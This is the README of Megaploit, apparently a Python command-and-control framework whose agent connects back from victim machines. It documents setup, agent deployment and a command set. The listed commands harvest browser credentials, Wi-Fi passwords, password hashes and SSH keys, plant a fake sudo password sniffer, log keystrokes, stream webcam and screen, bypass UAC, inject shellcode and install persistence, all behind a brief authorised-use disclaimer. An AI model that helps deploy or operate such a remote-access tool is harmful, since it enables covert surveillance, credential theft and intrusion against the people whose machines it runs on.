# Megaploit

**Professional Remote Access Framework · v2.2.0**

> **For authorised security research and penetration testing only.**  
> You must have explicit written permission before using this tool against any system.  
> Misuse is illegal and unethical. The authors accept no liability.

---

## Table of Contents

1. [Overview](#overview)
2. [Changelog](#changelog)
3. [Architecture](#architecture)
4. [Requirements](#requirements)
5. [Installation](#installation)
6. [Quick Start](#quick-start)
7. [Server Console](#server-console)
   - [Global Commands](#global-commands)
   - [Session Commands](#session-commands)
   - [Options](#options)
8. [Toolbox](#toolbox)
9. [Plugin System](#plugin-system)
10. [Agent](#agent)
11. [Streaming](#streaming)
12. [Loot](#loot)
13. [Security Model](#security-model)
14. [Wire Protocol](#wire-protocol)
15. [Module Reference](#module-reference)
16. [Directory Layout](#directory-layout)
17. [Contributing](#contributing)

---

## Changelog

### v2.2.0

#### Console — Visual redesign
- 256-colour gradient banner (bright red → dark via 256-colour escape codes)
- Startup config rendered in a rounded `╭─ Server Configuration ─╮` box
- New-session alert now shown as a full green bordered box with address and `use <id>` hint
- Global prompt: `msf►megaploit [N] »` — live session-count badge (green when active, grey when idle)
- Session prompt: `msf►megaploit session(id) »` with bold cyan ID
- Spinner now shows elapsed time alongside braille animation
- Progress bar (`██████░░░░ 66% building…`) shown during `toolbox install`
- `toolbox install` result displayed in a green rounded success box
- `toolbox info` rendered in a rounded info box
- `toolbox list` gains a `LANG` column and `●/○` status dots
- `toolbox search` shows tags inline below each result
- `toolbox update / update-all` use spinner instead of raw output
- Dangerous command confirmation redesigned: `⚠ destructive operation` + styled `Type YES` prompt
- `help` screen uses `━━━ Section ━━━` headers, cyan commands, yellow options, dangerous commands highlighted
- `set` output uses `→` arrow with cyan value colouring

#### Toolbox installer — Smart fallbacks for all languages
- **Go**: `go build -o <name> ./...` explicitly places the binary; fallback is `go run ./...` (never executes `.go` source directly)
- **Rust**: scans `target/release/` for any binary after `cargo build`; fallback is `cargo run --release --`
- **Java**: fallback to `mvn exec:java` or `gradle run` when no jar produced; entry no longer set to `pom.xml`
- **Binary/C**: fallback to `make run` when no binary found after cmake/make
- **Unknown lang**: scans for an existing executable before giving up; warns clearly
- All build steps are now individually wrapped in `try/except` — one failed step warns and continues instead of aborting the install
- `_find_binary`: replaced `"." not in f` heuristic with an explicit source/config extension blocklist; versioned names like `gobuster-1.2` are now found correctly; `.exe` always accepted on Windows
- `toolbox update` now refreshes `tool.entry` alongside `run_cmd` after `git pull + rebuild`
- New `toolbox rebuild <name>` command: re-runs the build step in-place without a git pull (repairs broken installs)
- `toolbox_run` / `toolbox_deploy` typed at the global prompt now give a clear "must be run inside a session" message instead of `Unknown command`

#### Auto-update
- New `--auto-update` flag on `server.py`: when set, any tool with a newer remote commit is automatically updated in the background via `installer.update()`
- `set auto_update on/off` toggles it at runtime without restarting
- Auto-updated tools show `[✓] Auto-updated gobuster  abc1234 → def5678` between prompts
- Failed auto-updates show `[✗]` with the error and a manual fallback command
- Megaploit itself is never auto-updated (requires restart)

#### Capture & streaming — Performance overhaul
- **`screenshot`**: replaced `pyautogui.screenshot()` PNG-to-disk with `mss` + `cv2` JPEG encode (quality 85) entirely in memory — ~10× smaller per frame, no disk I/O before transfer
- **`screenshot_timelapse`**: all frames JPEG-encoded in-memory (`list[bytes]`); zip assembled via `ZipFile.writestr` — zero disk I/O; `ZIP_DEFLATED` → `ZIP_STORED` (JPEGs don't compress further); frame cap raised 60 → 120
- **`screenrecord`**: `time.sleep(1/fps)` replaced by monotonic deadline loop eliminating drift; default output scaled to 1280 px wide (aspect-preserving, even-dimension enforced); XVID AVI → mp4v MP4; optional `fps` and `scale_width` args (`screenrecord 30 15 960`)
- **`Camera` (live stream)**: `time.time()` → `time.monotonic()` throughout; separate `_frame_lock` for frame buffer; downscaled to 1280 px wide before JPEG encode; adaptive JPEG quality 40–85 (backs off when encode exceeds 60 % of frame budget, recovers when load drops); `target_fps` and `scale_width` are class-level config

---

## Overview

Megaploit is a modular, extensible C2 (Command & Control) framework written in Python 3.10+.

Key properties:

- **Metasploit-style console** — 256-colour gradient banner, rounded info boxes, live session badge, adaptive spinner with elapsed time, progress bar during installs
- **Multi-session** — unlimited simultaneous agent connections; `use <id>` to switch between them
- **HMAC-SHA256 authentication** — every connection is challenge-response authenticated before any command runs
- **Hardened TLS 1.2+** — optional; enforces AEAD-only cipher suites, no renegotiation, no compression, forward secrecy required
- **Rate limiter + IP allowlist** — per-IP sliding-window rate limiter auto-bans after 5 failed attempts; optional `--allow-ip` restricts who can even attempt auth
- **Audit log** — every connection attempt, dispatched command, and result recorded to `loot/audit.log` with UTC timestamps
- **Toolbox** — install any GitHub tool in any language (Python, Go, Rust, Node.js, Ruby, Java, Bash, PowerShell, C/C++) and run it locally against victims or deploy it onto the target
- **Plugin system** — community-contributed TOML files that add new commands without writing Python
- **Live streaming** — MJPEG desktop stream (port 5000) and webcam stream (port 5001) with filters and recording
- **Background update checker** — notifies you of updates for Megaploit itself and every installed tool; optional `--auto-update` flag applies tool updates automatically in the background

---

## Architecture

```
Megaploit-main/
├── server.py                    ← operator entry-point
├── agent.py                     ← agent payload entry-point
├── secret.key                   ← shared HMAC secret (you generate this)
├── cert.pem / key.pem           ← TLS certs (optional)
├── requirements.txt
├── install.sh
├── plugins/                     ← drop *.toml plugin files here
│   └── example.toml
├── tools/                       ← toolbox clones land here
│   └── tools.json               ← persistent tool catalogue
├── loot/                        ← all collected data
│   ├── screenshots/
│   ├── recordings/
│   ├── downloads/
│   └── audit.log                ← connection + command audit trail (UTC timestamps)
└── megaploit/
    ├── core/                    ← shared constants, protocol, crypto
    ├── server/                  ← CLI, listener, sessions, commands
    ├── agent/                   ← connection loop, command handlers, keylogger
    ├── streaming/               ← Flask MJPEG servers
    ├── toolbox/                 ← GitHub tool installer, runner, updater
    └── plugins/                 ← TOML plugin loader and runner
```

The server and agent are completely separate processes. The agent connects *back* to the server (reverse shell model), so no inbound firewall rule is needed on the victim.

---

## Requirements

| Requirement | Notes |
|---|---|
| Python 3.10+ | 3.11+ preferred (stdlib `tomllib`; 3.10 uses `tomli` polyfill) |
| `git` on PATH | For toolbox clone/update and self-update checks |
| Linux / macOS / Windows | Agent supports all three; server recommended on Linux |

Python packages are listed in [`requirements.txt`](requirements.txt).  
Notable choices:

- **`sounddevice` + `soundfile`** — ships bundled PortAudio binaries, no system library needed
- **`tomli`** (Python 3.10 only) — TOML parser for the plugin system; Python 3.11 uses the stdlib `tomllib`
- **`Flask` + `Werkzeug`** — agent-side MJPEG streaming servers
- **`cryptography`** — recommended on the agent for `browser_creds` AES-GCM decryption on Linux/macOS

---

## Installation

### Automated (Linux)

```bash
sudo bash install.sh
```

The installer:
1. Detects your distro family (Debian/Ubuntu/Kali, Arch/Manjaro, Fedora, RHEL/CentOS)
2. Installs system packages (`git`, `python3`, `python3-pip`, OpenGL libs for streaming)
3. Checks for Python ≥ 3.10
4. Clones Megaploit to `/opt/megaploit`
5. Installs Python dependencies via pip
6. Creates a `/usr/local/bin/megaploit` shell wrapper

After installation:

```bash
megaploit -lh <your-ip> -p 4444
```

### Manual

```bash
git clone https://github.com/JosephFrankFir/Megaploit.git
cd Megaploit
pip install -r requirements.txt
```

---

## Quick Start

**Step 1 — Generate a shared secret key** (do this once):

```bash
python3 -c "import os,binascii; open('secret.key','wb').write(binascii.hexlify(os.urandom(32)))"
```

Copy `secret.key` to the target machine alongside `agent.py`.

**Step 2 — Start the server**:

```bash
python3 server.py -lh 192.168.1.10 -p 4444
```

**Step 3 — Generate and deploy the agent**:

```
megaploit > set lhost 192.168.1.10
megaploit > set port 4444
megaploit > generate
```

Copy `agent.py` and `secret.key` to the target, then run:

```bash
python3 agent.py
```

**Step 4 — Interact with the session**:

```
megaploit > sessions
megaploit > use 1
megaploit session(1) > sysinfo
megaploit session(1) > screenshot
megaploit session(1) > browser_creds
```

---

## Server Console

```
python3 server.py -lh <callback-ip> -p <port> [options]

Options:
  -lh, --lhost       IP the agent connects back to (required)
  -p,  --port        TCP port (required)
  -rh, --rhost       Bind IP for the listener socket (default: 0.0.0.0)
  --cert             SSL certificate file (PEM) — enables TLS 1.2+
  --key              SSL private key file (PEM) — enables TLS 1.2+
  --secret           Path to secret.key (default: secret.key)
  --allow-ip <IP>    Allowlisted source IP (repeat for multiple)
  --auto-update      Auto-apply tool updates in the background (tools only; Megaploit itself requires manual git pull)
```

### Global Commands

| Command | Description |
|---|---|
| `sessions` | List all active sessions with ID, IP, port, and uptime |
| `use <id>` | Enter the session interaction prompt for session `<id>` |
| `generate [-c] [--tls]` | Patch `connection.py` with LHOST/PORT/USE_TLS; `-c` byte-compiles `agent.py` |
| `set lhost <ip>` | Set the callback IP address |
| `set port <port>` | Set the callback port |
| `set cert <file>` | Set the SSL certificate file |
| `set key <file>` | Set the SSL private key file |
| `set auto_update <on\|off>` | Toggle background auto-update at runtime |
| `toolbox …` | Manage and run toolbox tools (see [Toolbox](#toolbox)) |
| `plugins …` | Manage plugins (see [Plugin System](#plugin-system)) |
| `help` / `?` | Show all global commands, options, installed tools, and loaded plugins |
| `clear` | Clear the terminal |
| `exit` | Gracefully shut down the listener and exit |

### Session Commands

These commands are available inside a session (`megaploit session(N) >`):

**Core / shell**

| Command | Description |
|---|---|
| `sysinfo` | OS, hostname, user, arch, Python version, CPU%, RAM, disk |
| `shell <command>` | Execute an arbitrary shell command on the target |
| `cd <directory>` | Change working directory on the target |
| `upload <local_file>` | Push a local file to the target over the C2 channel |
| `download <remote_file>` | Pull a file from the target to `loot/downloads/` |
| `zip_download <path>` | Zip a directory/file on the target and pull the archive in one transfer |
| `back` | Return to the global prompt without closing the session |
| `exit` | Send exit signal to the agent and close the session |

**Screen / audio**

| Command | Description |
|---|---|
| `screenshot` | Capture a JPEG screenshot via `mss`+`cv2` (~10× smaller than PNG, no disk I/O on target) |
| `screenshot_timelapse <count> <interval>` | Take N JPEG screenshots every N seconds, zip in-memory and pull back (frame cap: 120) |
| `screenrecord <seconds> [fps] [scale_width]` | Record the desktop as MP4 (default 12 fps, 1280 px wide); monotonic clock pacing eliminates drift |
| `record <seconds>` | Record microphone audio (WAV) to `loot/recordings/` (max 300s) |
| `mic_level` | Snapshot peak dB level — detect if someone is speaking |
| `screen_stream <on\|off>` | Start/stop MJPEG desktop stream at `http://<target>:5000` |
| `webcam <on\|off>` | Start/stop MJPEG webcam stream at `http://<target>:5001` |

**Credential harvesting**

| Command | Description |
|---|---|
| `browser_creds [cookies\|passwords\|all]` | Extract Chrome/Edge/Brave/Firefox credentials — full DPAPI+AES-256-GCM decryption |
| `browser_history [count]` | Pull visit history from Chrome/Firefox/Edge SQLite databases |
| `wifi_passwords` | Extract saved Wi-Fi credentials (cross-platform) |
| `hashdump` | Dump `/etc/shadow` (Linux) or SAM+SYSTEM hive (Windows) |
| `cred_vault` | Enumerate Windows Credential Manager via `CredEnumerateW` |
| `ssh_harvest` | Collect SSH private keys, `known_hosts`, `authorized_keys`, and shell history |
| `sudo_sniff [log_path]` | Plant a fake `sudo` wrapper that captures the password to a file |

**Recon / awareness**

| Command | Description |
|---|---|
| `search <path> <keyword>` | Recursive file-content grep (skips binary, caps at 200 hits) |
| `idle_time` | Seconds since last keyboard/mouse input |

**Pivoting / networking**

| Command | Description |
|---|---|
| `portfwd <lport> <rhost> <rport>` | TCP relay from agent port to a remote host:port in a daemon thread |
| `socks5 [port]` | Start a full SOCKS5 proxy server on the target (no-auth, IPv4/domain/IPv6) |
| `reverse_shell <ip> <port>` | Spawn a PTY reverse shell back to a second listener |

**Evasion / privilege escalation**

| Command | Description |
|---|---|
| `lock_screen` | Silently lock the workstation (Windows/macOS/Linux) |
| `token_steal [pid]` | Windows token impersonation via `DuplicateToken` + `ImpersonateLoggedOnUser` `[!]` |
| `uac_bypass <command>` | fodhelper registry hijack — runs `<command>` elevated, no UAC prompt `[!]` |
| `living_off_land <lolbin> <args>` | Execute via signed Windows LOLBins (mshta/certutil/rundll32/wmic/cscript/etc.) |

**Code injection**

| Command | Description |
|---|---|
| `inject_shellcode <pid> <hex>` | `VirtualAllocEx` + `WriteProcessMemory` + `CreateRemoteThread` shellcode injection `[!]` |
| `dll_inject <pid> <dll_path>` | `LoadLibraryA` remote thread DLL injection `[!]` |

**Keylogger**

| Command | Description |
|---|---|
| `keylog_start` | Start the keystroke logger on the target |
| `keylog_dump` | Read and print captured keystrokes |
| `keylog_stop` | Stop the keylogger and delete the log file |

**Persistence / cleanup**

| Command | Description |
|---|---|
| `persist <regname> <filename>` | Install Windows Run-key persistence |
| `self_destruct` | Wipe the agent binary, remove persistence, delete keylog; `os._exit(0)` `[!]` |
| `forkbomb` | Crash the target process tree (Unix only) `[!]` |

**GUI control**

| Command | Description |
|---|---|
| `msgbox <title> <message>` | Pop a visible dialog on the target's screen |
| `mouse_move <x> <y> [click]` | Silently move (and optionally click) the mouse |
| `type_keys text\|hotkey <args>` | Type text or fire a hotkey combo |

**Toolbox (inside a session)**

| Command | Description |
|---|---|
| `toolbox_run <name> [args]` | Run an installed tool *locally* (operator side) against the session IP |
| `toolbox_deploy <name> [args]` | Upload the tool to the target and execute it there |

> Commands marked `[!]` are **dangerous** — the console prompts for `YES` confirmation before executing.  
> Any unrecognised input is forwarded verbatim to the agent's shell.

### Options

```
megaploit > set
  Option        Value
  ────────────  ────────────────────
  lhost         192.168.1.10
  port          4444
  cert          (none)
  key           (none)
  auto_update   off
```

---

## Toolbox

Install any public GitHub repository as a first-class Megaploit tool — regardless of language. Tools persist in `tools/tools.json` across restarts.

```
megaploit > toolbox install <repo_url> <name> [description] [--tags tag1,tag2]
megaploit > toolbox list
megaploit > toolbox info <name>
megaploit > toolbox search <query>
megaploit > toolbox update <name>
megaploit > toolbox update-all
megaploit > toolbox check-updates
megaploit > toolbox remove <name>
megaploit > toolbox set-entry <name> <path>
megaploit > toolbox rebuild <name>
```

**Note:** `toolbox install/list/etc.` must be typed at the global `megaploit >` prompt, not inside a session. Inside a session use `toolbox_run` or `toolbox_deploy`.
If you type `toolbox_run` or `toolbox_deploy` at the global prompt, the console now shows a clear "must be run inside a session" message with the correct `use <id>` instruction.

### Supported Languages

| Language | Detection Signal | Build Step |
|---|---|---|
| Python | `requirements.txt`, `setup.py`, `pyproject.toml`, `*.py` | `python -m venv .venv` + `pip install` |
| Go | `go.mod`, `go.sum` | `go build -o <name> ./...` (explicit output path); fallback: `go run ./...` |
| Rust | `Cargo.toml` | `cargo build --release`; fallback: `cargo run --release --` |
| Node.js | `package.json` | `npm install` |
| Ruby | `Gemfile`, `*.rb` | `bundle install` |
| Java | `pom.xml`, `build.gradle` | `mvn package` or `gradle build`; fallback: `mvn exec:java` / `gradle run` |
| Bash | `*.sh` at root | `chmod +x` |
| PowerShell | `*.ps1` at root | `pwsh -ExecutionPolicy Bypass -File` |
| C/C++ | `CMakeLists.txt`, `Makefile` | `cmake + make` or `make` |
| Binary | Executable with no extension | `chmod +x` |

### Remote Deploy Strategies

| Language | What gets uploaded | How it runs |
|---|---|---|
| Python | `entry.py` + `requirements.txt` | `pip install -r req.txt && python entry.py` |
| Bash / Shell | `entry.sh` | `bash entry.sh` |
| PowerShell | `entry.ps1` | `pwsh -ExecutionPolicy Bypass -File entry.ps1` |
| Ruby | `entry.rb` | `ruby entry.rb` |
| Go / Rust / C binary | compiled binary | `chmod +x && ./binary` |
| Java | `.jar` file | `java -jar tool.jar` |
| Node.js | `entry.js` only | `node entry.js` — `node_modules` not uploaded; use `toolbox_run` for dep-heavy tools |

---

## Plugin System

Drop a `.toml` file into `plugins/`. It loads automatically on startup and is instantly available as a new CLI command. No restart needed after `plugins reload`.

```toml
[plugin]
name        = "recon"
version     = "1.0.0"
author      = "Alice"
description = "Quick recon commands"

[[command]]
name        = "portscan"
kind        = "local"
description = "nmap scan against the session target"
usage       = "portscan <ports>"
shell       = "nmap -sV -p {arg0} {session_ip}"
min_args    = 1

[[command]]
name        = "getuid"
kind        = "session"
description = "Print current user on the target"
shell       = "id"
```

### Command Kinds

| `kind` | Runs on | How |
|---|---|---|
| `local` | Operator machine | Spawns a local subprocess; output streamed line-by-line |
| `session` | Active agent | Sends the expanded shell string over the C2 channel |
| `python` | Operator machine | Imports and calls a Python function by dotted path |

### Placeholders

| Placeholder | Value |
|---|---|
| `{session_ip}` | IP address of the current session |
| `{session_id}` | Numeric session ID |
| `{lhost}` | Operator's `lhost` setting |
| `{port}` | Operator's `port` setting |
| `{arg0}`, `{arg1}`, … | CLI arguments after the command name |

### Plugin CLI Commands

| Command | Description |
|---|---|
| `plugins` / `plugins list` | List all loaded plugins and their commands |
| `plugins reload` | Re-scan `plugins/` and reload without restarting |
| `plugins info <name>` | Full details: author, source file, all commands |

---

## Agent

The agent (`agent.py`) is the payload deployed on the target. It:

1. Connects back to the server on `LHOST:PORT` (reverse — no inbound firewall rule needed)
2. Performs HMAC-SHA256 authentication
3. Optionally wraps in TLS 1.2+ with AEAD-only ciphers (`USE_TLS = True`)
4. Enters a receive-execute-respond loop
5. Silently reconnects with jitter: `RECONNECT_DELAY + random(0, RECONNECT_JITTER)` seconds

### Generating the Payload

```
megaploit > set lhost 192.168.1.10
megaploit > set port 4444
megaploit > generate           # plain TCP
megaploit > generate --tls     # with TLS (requires --cert / --key on the server)
megaploit > generate -c        # byte-compile agent.py to .pyc
```

Minimum files needed on the target:

```
agent.py
secret.key
megaploit/   ← the entire package directory
```

---

## Streaming

### Desktop Stream

```
megaploit session(1) > screen_stream on
```

Open `http://<target-ip>:5000` in a browser.
The stream runs at **20 fps** (configurable via `Camera.target_fps`), downscaled to **1280 px wide** before encoding, with **adaptive JPEG quality** (40–85): quality backs off automatically when the encoder is under load to keep the frame rate stable.
Stop with `screen_stream off`.

### Webcam Stream

```
megaploit session(1) > webcam on
```

Open `http://<target-ip>:5001`. UI buttons: Stop/Start, Capture (saves to `loot/screenshots/`), Greyscale, Negative, Face-Only (DNN), Record (AVI to `loot/recordings/`).  
Stop with `webcam off`.

---

## Loot

All files collected from sessions are saved under `loot/`:

```
loot/
├── screenshots/    shot_<ip>_<utc-timestamp>_<n>.jpg    (screenshot — JPEG, ~10× smaller than PNG)
├── recordings/     rec_<ip>_<utc-timestamp>_<n>.wav     (record <seconds>)
│                   webcam_<ts>.avi                       (webcam Record button)
├── downloads/      <n>_<filename>                        (download / zip_download / timelapse zip)
│                   screenrec.mp4                         (screenrecord — MP4, replaces AVI)
└── audit.log       one line per connection + command event, UTC timestamps
```

> Screenshots are now saved as JPEG (`.jpg`) rather than PNG. JPEG is ~10× smaller for typical screen content with no perceptible quality difference at quality 85.

**Audit log format:**

```
2024-01-15 14:32:01 UTC  LISTEN    bind=0.0.0.0:4444  tls=yes  allowlist=none
2024-01-15 14:32:18 UTC  ACCEPTED  ip=10.0.0.20  port=54321  session=1  cipher=ECDHE-RSA-AES256-GCM-SHA384
2024-01-15 14:33:01 UTC  REJECTED  ip=192.168.1.99  port=41234  reason=auth_failed
2024-01-15 14:33:05 UTC  BANNED    ip=192.168.1.99  attempts=6  ban_until=14:38:05
2024-01-15 14:33:10 UTC  CMD       session=1  ip=10.0.0.20  status=OK  cmd=screenshot
```

---

## Security Model

### Authentication

1. Server sends a random 16-byte challenge
2. Agent responds with `HMAC-SHA256(secret_key, challenge)` — 32-byte digest
3. Server verifies with `hmac.compare_digest()` (constant-time, prevents timing attacks)
4. Connection is dropped immediately on failure

### Transport Encryption

TLS is opt-in but strongly recommended for non-lab use.

```bash
# Generate a self-signed cert:
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes \
  -subj "/CN=megaploit"

# Start server with TLS:
python3 server.py -lh 10.0.0.1 -p 4444 --cert cert.pem --key key.pem

# Patch agent for TLS:
megaploit > generate --tls
```

**Enforced when TLS is active:** TLS 1.2 minimum, AEAD-only ciphers (`ECDHE+AESGCM`, `ECDHE+CHACHA20`, `DHE+AESGCM`, `DHE+CHACHA20`), no CBC/RC4/export, no renegotiation, no compression, forward secrecy required.

### Rate Limiter & IP Allowlist

**Rate limiter** (always active): 60-second sliding window per source IP. After `MAX_AUTH_ATTEMPTS_PER_MIN` (default: 5) attempts, the IP is banned for `IP_BAN_DURATION` (default: 300 s).

**IP allowlist** (opt-in):
```bash
python3 server.py -lh 10.0.0.1 -p 4444 --allow-ip 10.0.0.20 --allow-ip 10.0.0.21
```

### Secret Key

32-byte random value stored as 64 hex chars in `secret.key`.

**Never commit `secret.key` to a repository.**

```bash
python3 -c "import os,binascii; open('secret.key','wb').write(binascii.hexlify(os.urandom(32)))"
```

On startup the console prints a **key fingerprint** (first 16 hex chars of `SHA-256(key)`) so you can verify both sides share the same key without exposing it.

---

## Wire Protocol

All C2 traffic travels on a single persistent TCP connection per session.

```
Client (agent)                    Server (operator)
  │                                     │
  │  <── 16-byte random challenge       │   server sends first
  │                                     │
  │  HMAC-SHA256(key, challenge) ──────>│   32-byte digest
  │                                     │
  │      [authenticated — begin loop]   │
  │                                     │
  │  <── [4B length] [JSON command]     │   server sends command
  │                                     │
  │  [4B length] [JSON response] ──────>│   agent sends result
  │            OR                       │
  │  [4B length]["FILE_OK"] ───────────>│   agent signals file incoming
  │  [4B length] [raw file bytes] ─────>│   agent sends binary file
```

### Message Framing

Every message (text or file) is framed with a **4-byte big-endian unsigned integer** length prefix followed by the payload bytes:

```
[ uint32 payload_length (4 bytes, network byte order) ][ payload bytes ]
```

This replaces the old `b"<<MEGAPLOIT_END>>"` sentinel scheme. The sentinel approach was fragile: if the sentinel byte sequence appeared inside binary data (e.g. a PNG screenshot, WAV recording, or compiled binary) it would silently corrupt the transfer. Length-prefix framing has no such ambiguity.

### File Transfer Handshake

Before sending a binary file, the agent sends a `"FILE_OK"` status message. The server reads this status first:

- If the agent could not produce the file (missing dependency, permission error, etc.) it returns an error string instead of `"FILE_OK"`. The server displays the error to the operator — **no corrupt file is written to disk**.
- If the agent sends `"FILE_OK"`, the server proceeds with `recv_file`.

This handshake is why screenshots, recordings, downloads, timelapse zips, and screen recordings are always either a valid file or a clear error — never a corrupt unusable blob.

---

## Module Reference

### megaploit.core

#### `config.py` — Shared constants

| Constant | Default | Description |
|---|---|---|
| `AUTH_TIMEOUT` | `10` | Seconds before authentication times out |
| `RECONNECT_DELAY` | `10` | Base seconds the agent waits before reconnecting |
| `RECONNECT_JITTER` | `5` | Random 0–5 s added to each reconnect delay |
| `MAX_AUTH_ATTEMPTS_PER_MIN` | `5` | Per-IP rate limit before auto-ban |
| `IP_BAN_DURATION` | `300` | Seconds a banned IP stays blocked |
| `SCREEN_STREAM_PORT` | `5000` | Port for the desktop MJPEG server |
| `WEBCAM_STREAM_PORT` | `5001` | Port for the webcam MJPEG server |
| `MAX_RECORD_SECONDS` | `300` | Maximum microphone recording length |
| `AUDIT_LOG` | `"loot/audit.log"` | Path to the audit log |

#### `protocol.py` — Wire protocol

```python
send_msg(conn, data)              # JSON-encode, 4-byte length-prefix, send
recv_msg(conn) -> str             # Read length header then payload; return decoded string
send_file(conn, path)             # 4-byte length + raw file bytes
recv_file(conn, path, timeout)    # Read length header then raw bytes; write to path
```

All framing uses `struct.pack("!I", length)` — a 4-byte big-endian unsigned int. There is no sentinel. Binary data is never altered or scanned.

#### `crypto.py` — HMAC-SHA256 authentication

```python
load_key(path="secret.key") -> bytes
key_fingerprint(key: bytes) -> str
server_authenticate(conn, secret_key, timeout=10) -> bool
agent_authenticate(conn, secret_key, timeout=15) -> bool
```

---

### megaploit.server

#### `session.py` — `Session`

| Field | Type | Description |
|---|---|---|
| `conn` | `socket.socket` | The connected socket |
| `ip` | `str` | Agent IP address |
| `port` | `int` | Agent source port |
| `id` | `int` | Sequential session ID |
| `connected_at` | `float` | Unix timestamp of connection |

Methods: `close()`, `screenshot_path()` (includes UTC timestamp), `recording_path()`, `download_path(name)`.

#### `commands.py` — Command registry and dispatcher

```python
@_cmd(name, usage="", help_text="", dangerous=False)
def cmd_handler(session: Session, args: list[str]) -> CommandResult: ...

CommandResult(ok: bool, output: str = "", close_session: bool = False)

dispatch(session, raw_input) -> CommandResult
all_commands() -> dict[str, _CommandDef]
```

All dispatched commands are written to `loot/audit.log`. File-receiving commands use `_recv_file_or_err()` which reads the agent's `FILE_OK` / error handshake before calling `recv_file`.

#### `listener.py` — `Listener`

```python
Listener(bind_host, port, secret_key, on_session, ssl_context=None, allowed_ips=None)
listener.start()   # non-blocking
listener.stop()
```

Five hardening layers per connection, in order: IP allowlist → rate limiter → TLS upgrade → HMAC auth → session creation.

#### `cli.py` — `Console`

Interactive operator console. Manages the global prompt loop, session interaction loop, plugin loading, update checker, and all sub-command dispatchers. The `toolbox install/list/etc.` commands are intercepted at the global level and never forwarded to the agent shell.

---

### megaploit.agent

#### `handlers.py` — All victim-side command implementations

Every handler is registered with `@_register("name")`. Handlers that send a binary file always send `send_msg(conn, "FILE_OK")` immediately before `send_file(conn, path)`. On failure they return an error string (which `shell.py` sends back as a normal message) — the server's `_recv_file_or_err()` handles the distinction cleanly.

| Category | Handlers |
|---|---|
| Shell / filesystem | `cd`, `sysinfo`, `upload`, `download`, `zip_download`, `search` |
| Screen / audio | `screenshot`, `screenshot_timelapse`, `screenrecord`, `record`, `mic_level` |
| Streaming | `screen_stream`, `webcam` |
| Credential harvesting | `browser_creds`, `browser_history`, `wifi_passwords`, `hashdump`, `cred_vault`, `ssh_harvest`, `sudo_sniff` |
| Pivoting | `portfwd`, `socks5`, `reverse_shell` |
| Evasion / escalation | `lock_screen`, `token_steal`, `uac_bypass`, `living_off_land` |
| Code injection | `inject_shellcode`, `dll_inject` |
| Keylogger | `keylog_start`, `keylog_dump`, `keylog_stop` |
| Persistence / cleanup | `persist`, `self_destruct`, `forkbomb` |
| GUI control | `msgbox`, `mouse_move`, `type_keys`, `idle_time` |

Unrecognised commands fall through to `_shell_exec(cmd)` — `subprocess.Popen(shell=True, cwd=os.getcwd())`.

#### `keylogger.py` — `Keylogger`

Uses `pynput.keyboard.Listener`. Methods: `start()`, `stop()`, `read_logs()`, `destroy()`.

---

### megaploit.streaming

- **`screen.py`** — `Camera` singleton: `mss` screen capture at 20 fps (configurable), downscaled to 1280 px wide, adaptive JPEG quality 40–85 (backs off under load), monotonic-clock pacing, separate `_frame_lock` for the frame buffer, auto-stops after 10 s of inactivity
- **`desktop.py`** — Flask app (port 5000): `/` → `desktop.html`; `/video_feed` → MJPEG from `Camera`
- **`webcam.py`** — Flask app (port 5001): greyscale/negative/face-crop filters, server-side recording. `POST /control` toggles: `toggle_grey`, `toggle_neg`, `toggle_face`, `toggle_cam`, `capture`, `toggle_rec`

Each streaming server is tracked in a `dict[int, thread]` keyed by port — starting `webcam` and `screen_stream` simultaneously no longer causes a conflict.

---

### megaploit.toolbox

- **`registry.py`** — `Tool` dataclass + `ToolRegistry` (persistent `tools.json`)
- **`installer.py`** — multi-language build system; `install`, `uninstall`, `update`, `detect_language`, `build`, `detect_entry`
- **`runner.py`** — `run_local`, `run_remote`; uses `_upload_file()` helper that correctly drains the agent's ack after each file upload, preventing protocol desync
- **`updater.py`** — `UpdateChecker`: background `git ls-remote` checks every 300 s; `drain()` yields formatted update notes; `auto_update=True` applies tool updates automatically via `installer.update()` and queues `tool_updated` / `tool_update_failed` notes; runtime toggle via `auto_update` property

---

### megaploit.plugins

- **`schema.py`** — `Plugin.from_toml(path)`, `PluginCommand` dataclass (`name`, `kind`, `description`, `shell`, `handler`, `min_args`, `dangerous`)
- **`loader.py`** — `PluginLoader`: `load_all()`, `get(name)`, `get_command(name)`, `is_plugin_command(name)`, `errors()`
- **`runner.py`** — `run_plugin_command(cmd, args, session, lhost, port, output)` dispatches to `_run_local`, `_run_session`, or `_run_python`

---

## Directory Layout

```
Megaploit-main/
├── server.py                        Server entry-point
├── agent.py                         Agent payload entry-point
├── requirements.txt                 Python dependencies
├── install.sh                       Linux auto-installer
├── secret.key                       HMAC shared secret (generate manually)
├── cert.pem / key.pem               TLS certificate and key (optional)
│
├── plugins/                         Community plugin files
│   └── example.toml
│
├── tools/                           Toolbox — cloned repos land here
│   └── tools.json                   Persistent tool catalogue
│
├── loot/                            All collected files
│   ├── screenshots/                 shot_<ip>_<utc>_<n>.png
│   ├── recordings/                  rec_<ip>_<utc>_<n>.wav
│   ├── downloads/                   <n>_<filename>
│   └── audit.log                    Connection + command audit trail
│
├── saved_model/                     Optional: DNN face-detection model for webcam
│   ├── deploy.prototxt.txt
│   └── res10_300x300_ssd_iter_140000.caffemodel
│
└── megaploit/
    ├── core/
    │   ├── config.py                Shared constants
    │   ├── crypto.py                HMAC authentication
    │   └── protocol.py             4-byte length-prefix framing for all messages + files
    ├── server/
    │   ├── cli.py                   Interactive console
    │   ├── commands.py              @_cmd registry + _recv_file_or_err handshake helper
    │   ├── listener.py              TCP accept loop + TLS + auth + rate limiter
    │   └── session.py               Session dataclass (UTC-stamped loot paths)
    ├── agent/
    │   ├── connection.py            Connect-back loop (LHOST/PORT/USE_TLS patched here)
    │   ├── handlers.py              All victim-side handlers; FILE_OK handshake before each file send
    │   ├── keylogger.py             pynput keystroke logger
    │   └── shell.py                 recv → handle → respond loop
    ├── streaming/
    │   ├── screen.py                Camera class (mss + OpenCV, 20 fps, 1280px, adaptive JPEG)
    │   ├── desktop.py               Flask MJPEG desktop stream (:5000)
    │   ├── webcam.py                Flask MJPEG webcam stream (:5001)
    │   └── templates/
    ├── toolbox/
    │   ├── registry.py              Tool dataclass + ToolRegistry
    │   ├── installer.py             Multi-language build system
    │   ├── runner.py                Local + remote execution; _upload_file ack-drain helper
    │   └── updater.py               Background git update checker
    └── plugins/
        ├── schema.py                Plugin + PluginCommand dataclasses + TOML parser
        ├── loader.py                PluginLoader — scans plugins/*.toml
        └── runner.py                Executes plugin commands (local/session/python)
```

---

